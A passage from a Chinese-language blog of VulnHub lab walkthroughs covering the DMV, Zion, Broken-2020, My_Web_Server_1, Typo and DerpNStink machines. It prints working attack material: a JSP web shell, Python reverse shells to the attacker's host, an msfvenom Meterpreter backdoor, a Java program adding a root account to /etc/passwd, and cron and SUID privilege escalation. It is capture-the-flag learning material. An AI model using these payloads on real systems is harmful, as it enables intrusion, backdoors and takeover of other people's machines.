pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里需要使用PSPY来检测后台的root进程<br />PSPY: <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p><p>这里可以看到root在运行<code>/var/www/html/tmp/clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/07.png" alt="" /></p><p>而且该sh脚本可写<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/08.png" alt="" /></p><p>那么可以利用root身份执行命令</p><p>给find命令添加SUID权限<br /><code>echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/09.png" alt="" /></p><p>find命令已经获得SUID权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/10.png" alt="" /></p><p>使用find命令获取root权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/11.png" alt="" /><br />这里可以看到<code>euid=0</code></p><p>查看flag<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/12.png" alt="" /></p><hr /><blockquote><p>find -&gt; bash</p></blockquote><p>之前使用find进行SUID进行提权时，执行id可以看到<code>euid=0</code>，但是获取bash时却还是原来的权限，这里使用<code>bash -p</code>则可以保留euid</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9">WalkThrough</a></p></blockquote><hr /><h1 id="zion"><a class="markdownIt-Anchor" href="#zion"></a> <a href="https://www.vulnhub.com/entry/zion-11,476/">Zion</a></h1><p><code>2020/05/21 13:09:10</code></p><h2 id="寻找靶机ip-5"><a class="markdownIt-Anchor" href="#寻找靶机ip-5"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/00.png" alt="" /></p><h2 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/01.png" alt="" /></p><h2 id="web路径扫描-5"><a class="markdownIt-Anchor" href="#web路径扫描-5"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.5/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/02.png" alt="" /></p><h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/03.png" alt="" /></p><p>点击Truth</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/04.png" alt="" /></p><p>可以看到HTTP Header中存在一些Base编码过的信息</p><p>点击Illusion</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/05.png" alt="" /></p><p>直接Get请求<code>/zion/login.php</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/06.png" alt="" /></p><p>对这些信息进行Base64解码</p><p><strong>Truth</strong><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/07.png" alt="" /></p><p>这里提示第二段编码中没有’+’, ‘-’, ‘/’, ‘=’<br />所以是Base62编码</p><p>对第二段编码进行Base62解码<br /><img src="/images/vulnhub_walkthrough_set/Zion/img/08.png" alt="" /><br /><a href="http://decode-base62.nichabi.com/">http://decode-base62.nichabi.com/</a></p><p>这里提示用户名和密码信息存在于选择页面</p><p><strong>Illusion</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/09.png" alt="" /></p><p>信息无效</p><p><strong>Get Request</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/10.png" alt="" /></p><p>信息无效</p><p>使用cewl进行字典生成<br /><code>cewl http://192.168.1.5/ &gt; dic1</code></p><p>转换为小写<br /><code>cat dic1 | tr A-Z a-z &gt; dic2</code></p><p>使用Burp进行账户爆破</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/11.png" alt="" /></p><p>得到账户<code>morpheus.thematrix:interpreted</code></p><p>登陆之后点击上方的Private Key</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/12.png" alt="" /></p><p>注意txt文本的文件名为<br /><code>rsa_priv_key_for_w.rabbit.txt</code></p><p>这里保存本地之后再加上Pri_Key文件的头部与尾部</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/13.png" alt="" /></p><p>SSH登入目标服务器<br /><code>ssh -i pri.key w.rabbit@192.168.1.5</code></p><h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2><p>查看文件<code>warning.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/14.png" alt="" /></p><p>查看mail</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/15.png" alt="" /></p><p>查看sudu权限</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/16.png" alt="" /></p><p>使用sudo权限来进行复制flag文件</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/17.png" alt="" /></p><p>这里可以看到flag文件的权限为600<br />需要在cp文件的同时更改权限，这里使用参数<code>--noreserve mode, ownership</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/18.png" alt="" /></p><p>查看flag</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/19.png" alt="" /></p><hr /><blockquote><p>HTTP信息</p></blockquote><p>根据Post的内容不同，在HTTP Response的Header中给出不同的信息，在实现上并不是难事，思维上也能很快接受这一机制，但是由于之前没有碰到过这种情况，导致在这一步上卡了很久。所以在浏览网页时最好还是使用BurpSuite，以便更加直观地看到全部的信息</p><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=jzmaM-s2yEY">WalkThrough</a></p></blockquote><hr /><h1 id="broken-2020"><a class="markdownIt-Anchor" href="#broken-2020"></a> <a href="https://www.vulnhub.com/entry/broken-2020-1,470/">Broken-2020</a></h1><p><code>2020/05/27 09:52:58</code></p><h2 id="寻找靶机ip-6"><a class="markdownIt-Anchor" href="#寻找靶机ip-6"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/00.png" alt="" /></p><h2 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/01.png" alt="" /></p><h2 id="web路径扫描-6"><a class="markdownIt-Anchor" href="#web路径扫描-6"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.116/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/02.png" alt="" /></p><h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.116/</code>，无有效信息</p><p>访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/03.png" alt="" /></p><p>根据指示点击按钮</p><p>再次访问<code>http://192.168.31.116/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/04.png" alt="" /></p><p>页面发生变化</p><p>再次访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/05.png" alt="" /></p><p>获取第一个flag</p><p>尝试再次扫描Web目录</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/06.png" alt="" /></p><p>访问新发现的目录<code>/cms/cc</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/07.png" alt="" /></p><p>尝试在端口输入处进行命令注入，失败</p><p>开启本地HTTP服务，再输入本地IP以及相应端口</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/08.png" alt="" /></p><p>可以看到该页面在请求本地资源<code>1c66b2e0cff58bal7b3f9a1994eb8c55.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/09.png" alt="" /></p><p>构造一个反弹Shell的文件，并且监听端口，再在burp中触发该文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/10.png" alt="" /></p><p>目标机器上下载了该文件并且执行了，接收到反弹Shell</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/11.png" alt="" /></p><h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2><p>查看目录<code>/home/alice</code>下的文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/12.png" alt="" /></p><p>这里提示root在后台运行清除apache日志的脚本，很存在crontab提权</p><p>下载pspy64</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/13.png" alt="" /></p><p>crontab运行任务如图，可以从<code>/home/alice/script/log.py</code>处入手</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/14.png" alt="" /></p><p>可以看到这个script目录所有人可写</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/15.png" alt="" /></p><p>即使文件log.py不可写，但是可以凭借目录的权限去修改文件名</p><p>本地构造Meterpreter的后门程序<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9993</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>下载本地的后门程序，并且对文件名进行操作</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/16.png" alt="" /></p><p>接收到反弹shell，进入目录<code>/home/alice/backup/</code><br />查看所有文本文件</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/17.png" alt="" /></p><p>运行pspy64，<a href="http://xn--rootbackup-oh4pe03a8zfg4mfr4dhdohx0cr3zb6t2aoo5a.py">可以看到root正在运行脚本backup.py</a></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/18.png" alt="" /></p><p>将web目录输入至path.txt</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/19.png" alt="" /></p><p>可以看到html文件夹被备份到了该目录下<br />而且权限均为777</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/20.png" alt="" /></p><p>尝试打包目录<code>/root/</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/21.png" alt="" /></p><p>查看文件夹root下的内容</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/22.png" alt="" /></p><hr /><blockquote><p>目录权限&amp;crontab</p></blockquote><p>看着log.py的744权限也是有心无力，参考别人的WalkThrough之后才发现是目录的权限问题。目录可写则可以任意修改目录下的文件名，配合crontab则可以提权。</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/broken-2020-1-vulnhub-walkthrough-43293614944a">WalkThrough</a></p></blockquote><hr /><h1 id="my_web_server_1"><a class="markdownIt-Anchor" href="#my_web_server_1"></a> <a href="https://www.vulnhub.com/entry/my-web-server-1,463/">My_Web_Server_1</a></h1><p><code>2020/06/03 19:12:46</code></p><h2 id="寻找靶机ip-7"><a class="markdownIt-Anchor" href="#寻找靶机ip-7"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/00.png" alt="" /></p><h2 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/01.png" alt="" /></p><h2 id="web路径扫描-7"><a class="markdownIt-Anchor" href="#web路径扫描-7"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.203/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.203:2222/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.203:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.203:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/05.png" alt="" /></p><h2 id="漏洞利用-23"><a class="markdownIt-Anchor" href="#漏洞利用-23"></a> 漏洞利用</h2><p>可以看到有三个Web入口，端口分别是80,2222,8080,8081<br />2222端口上运行的是nostromo服务，使用searchsploit查看相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/06.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/07.png" alt="" /></p><p>存在RCE漏洞，在MSF中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_exec</span><br><span class="line">set RHOSTS 192.168.31.203</span><br><span class="line">set RPORT 2222</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>即可获得权限</p><h2 id="权限提升-23"><a class="markdownIt-Anchor" href="#权限提升-23"></a> 权限提升</h2><p>查看tomcat的Web账户</p><p><code>cat /usr/local/tomcat/conf/tomcat-users.xml</code><br /><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/08.png" alt="" /></p><p>访问<code>http://192.168.31.203:8080/</code>,点击<code>Manager App</code></p><p>使用账户<code>tomcat:@sprot0230sp</code>进行登入</p><p>将jsp后门压缩为zip并更改后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip war.zip echo.jsp</span><br><span class="line">mv war.zip war.war</span><br></pre></td></tr></table></figure><p>登入tomcat的Web账户，上传jsp后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>利用原有的Shell构造python反弹Shell脚本<br />找一个可写目录<code>/var/nostromo/logs/</code>，<a href="http://xn--new-0v1e9ip79iu61b.py">写入脚本new.py</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#39;192.168.31.10&#39;,8081));</span><br><span class="line">os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);</span><br></pre></td></tr></table></figure><p>本地启用nc监听端口<br /><code>nc -lvvp 8081</code></p><p>访问jsp后门以执行命令<br /><code>http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py</code></p><p>接收到反弹的tomcat用户Shell</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/09.png" alt="" /></p><p>这里看到有bash的记录</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/10.png" alt="" /></p><p>使用过命令sudo -l</p><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/11.png" alt="" /></p><p>可以使用java进行sudo提权</p><p>本地构造java源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">    processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即写入账户test:hackforfun</p><p>本地启用HTTP服务<br /><code>python -m SimpleHTTPServer 9900 &amp;</code></p><p>目标服务器上下载源码<br /><code>wget http://192.168.31.10:9900/sudo.java</code></p><p>编译并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/12.png" alt="" /></p><p>成功写入账户信息</p><p>获取pty<br /><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/My_Web_Server_1/img/13.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=eOVm2G1sX4o">WalkThrough</a></p></blockquote><hr /><h1 id="typo1"><a class="markdownIt-Anchor" href="#typo1"></a> <a href="https://www.vulnhub.com/entry/typo-1,472/">Typo:1</a></h1><p><code>2020/06/09 21:51:36</code></p><h2 id="寻找靶机ip-8"><a class="markdownIt-Anchor" href="#寻找靶机ip-8"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/00.png" alt="" /></p><h2 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/01.png" alt="" /></p><h2 id="web路径扫描-8"><a class="markdownIt-Anchor" href="#web路径扫描-8"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.26/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/02.png" alt="" /></p><p><code>dirb http://192.168.31.26:8000/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/03.png" alt="" /></p><p><code>dirb http://192.168.31.26:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/04.png" alt="" /></p><p><code>dirb http://192.168.31.26:8081/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/05.png" alt="" /></p><h2 id="漏洞利用-24"><a class="markdownIt-Anchor" href="#漏洞利用-24"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.26/typo3/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.26:8080/phpinfo.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/07.png" alt="" /></p><p>访问<code>http://192.168.31.26:8081/phpmyadmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/08.png" alt="" /></p><p>phpmyadmin存在弱口令<code>root:root</code></p><p>登入后查看数据库，typo3对应80端口的Web服务</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/09.png" alt="" /></p><p>可以替换表中的Hash值来获取账号权限</p><p>访问 <a href="https://argon2.online/">https://argon2.online/</a> 生成Hash</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/10.png" alt="" /></p><p><code>$argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo</code></p><p>替换Hash值之后登入Typo3后台，CMS设定中不允许上传php文件</p><p><code>Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern]</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/11.png" alt="" /></p><p>清除内容即可解除对于文件上传的限制</p><p>使用weevely生成WebShell</p><p><code>weevely generate pass wee.php</code></p><p>上传WebShell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/12.png" alt="" /></p><p>访问Shell</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/13.png" alt="" /></p><p>连接Shell</p><p><code>weevely http://192.168.31.26/fileadmin/wee.php pass</code></p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/14.png" alt="" /></p><h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2><p>使用python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/15.png" alt="" /></p><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/16.png" alt="" /></p><p>查看具有SUID权限的文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/17.png" alt="" /></p><p>这里的<code>/usr/local/bin</code>路劲下的文件明显是不对劲的</p><p>apache2-restart为ELF文件</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/18.png" alt="" /></p><p>使用strings命令查看文件字符</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/19.png" alt="" /></p><p>使用的是service命令</p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Typo_1/img/20.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@arnavtripathy98/typo-1-vulnhub-walkthrough-ecd2971da7f8">WalkThrough</a></p></blockquote><hr /><h1 id="derpnstink"><a class="markdownIt-Anchor" href="#derpnstink"></a> <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink</a></h1><p><code>2020/06/22 14:53:48</code></p><h2 id="寻找靶机ip-9"><a class="markdownIt-Anchor" href="#寻找靶机ip-9"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/00.png" alt="" /></p><h2 id="端口扫描-25"><a class="markdownIt-Anchor" href="#端口扫描-25"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/01.png" alt="" /></p><h2 id="web路径扫描-9"><a class="markdownIt-Anchor" href="#web路径扫描-9"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.61/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/02.png" alt="" /></p><h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2><p>目录/weblog/设置了302跳转并指向了一个域名，需要修改hosts文件</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/04.png" alt="" /></p><p>使用Wordpress框架，可以使用wpscan进行扫描</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/05.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/06.png" alt="" /></p><p><code>wpscan --url http://derpnstink.local/weblog/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/07.png" alt="" /></p><p>查找插件相关信息<br /><code>searchsploit slideshow gallery 1.4.6</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/08.png" alt="" /></p><p>拷贝文件<br /><code>searchsploit -m 34681</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/09.png" alt="" /></p><p>需要Wordpress的账户</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/10.png" alt="" /></p><p>尝试弱口令得到账户<code>admin:admin</code></p><p>生成php后门<br /><code>weevely generate pass wee.php</code></p><p>使用脚本上传后门<br /><code>python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/11.png" alt="" /></p><p>连接后门<br /><code>weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass</code></p><p>python反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8081</span><br><span class="line">-----</span><br><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/12.png" alt="" /></p><h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/13.png" alt="" /></p><p>查看Wordpress配置信息<br /><code>cat /var/www/html/weblog/wp-config.php</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/14.png" alt="" /></p><p>得到unclestinky的密码Hash<br /><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/15.png" alt="" /></p><p>使用john破解Hash<br /><code>john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/16.png" alt="" /></p><p>得到密码</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/17.png" alt="" /><br /><code>stinky:wedgie57</code></p><p>尝试切换账户，成功</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/18.png" alt="" /></p><p>找到mrderp与stinky的对话</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/19.png" alt="" /></p><p>尝试寻找流量包</p><p><img 